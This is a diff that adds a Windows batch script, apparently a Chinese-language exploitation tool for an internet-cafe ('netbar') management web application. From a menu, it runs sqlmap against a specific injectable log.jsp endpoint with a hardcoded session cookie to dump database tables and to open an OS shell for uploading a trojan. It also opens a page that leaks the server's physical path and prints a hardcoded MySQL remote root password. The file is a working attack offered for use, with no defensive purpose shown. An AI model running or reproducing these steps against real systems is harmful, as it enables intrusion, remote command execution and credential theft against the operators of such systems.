@@ -1,0 +1,86 @@
+@echo off
+set mode con lines=30
+:0
+cls
+@echo              #############     ######     ########     #     #########                  
+@echo              #     #     #     #          #      #     #     #
+@echo              #     #     #     ######     #      #     #     #########
+@echo              #     #     #          #     #      #     #     #       #
+@echo              #     #     #     ######     ########     #　   #########
+@echo.
+@echo              嘟嘟牛注入点利用脚本  17/7/18
+@echo.                     
+@echo.                   测试注入点请选择（1）
+@echo.
+@echo                      传马请选择（2）
+@echo.
+@echo                    查看物理路径请选择（3）
+@echo.
+@echo                     查看MYSQL外连账户密码（4）
+@echo.
+set a=:
+set /p a= 请选择模式：
+set "a=%a:"=%"
+if "%a%"==":" goto 0
+if "%a%"=="1" goto 1
+if "%a%"=="2" goto 2
+if "%a%"=="3" goto 3
+if "%a%"=="4" goto 4
+if "%a%"=="0" goto 0
+goto 0
+
+:1
+echo.
+echo [+] 准备检查注入点 ！
+echo.
+echo [+] 加载PAYLOAD完成！
+echo.
+echo [+] 准备开始！ 
+echo.
+set b=
+set /P b=输入目标IP:
+cd C:\Python27\sqlmap
+sqlmap.py -u "http://%b%//netbar/log.jsp?moduleId=UserManage&moduleGroupId=0" --cookie "JSESSIONID=A6E169B5E662D5930223C65B39E8C425" --tables
+pause>nul
+goto 1
+
+:2
+echo.
+echo [+] 准备检查注入点 ！
+echo.
+echo [+] 加载PAYLOAD完成！
+echo.
+echo [+] 准备开始！ 
+echo.
+set c=
+set /P c=输入目标IP:
+cd C:\Python27\sqlmap
+sqlmap.py -u "http://%c%//netbar/log.jsp?moduleId=UserManage&moduleGroupId=0" --cookie "JSESSIONID=A6E169B5E662D5930223C65B39E8C425" --os-shell
+pause>nul
+goto 2
+
+:3
+echo.
+echo [+] 准备检查物理路径 ！
+echo.
+echo [+] 加载PAYLOAD完成！
+echo.
+echo [+] 准备开始！ 
+echo.
+set b=
+set /P b=输入目标IP:
+start http://%b%/netbar/setindex.jsp
+ pause>nul
+goto 3
+
+:4
+echo.
+echo [+] MYSQL外连账号密码！
+echo.
+echo [+] 输出账号密码中！
+echo.
+echo [+] 远程连接账号:root密码:szsunlikedataserver！ 
+echo.
+echo [+] 输出完成 ！
+pause>nul
+goto 4
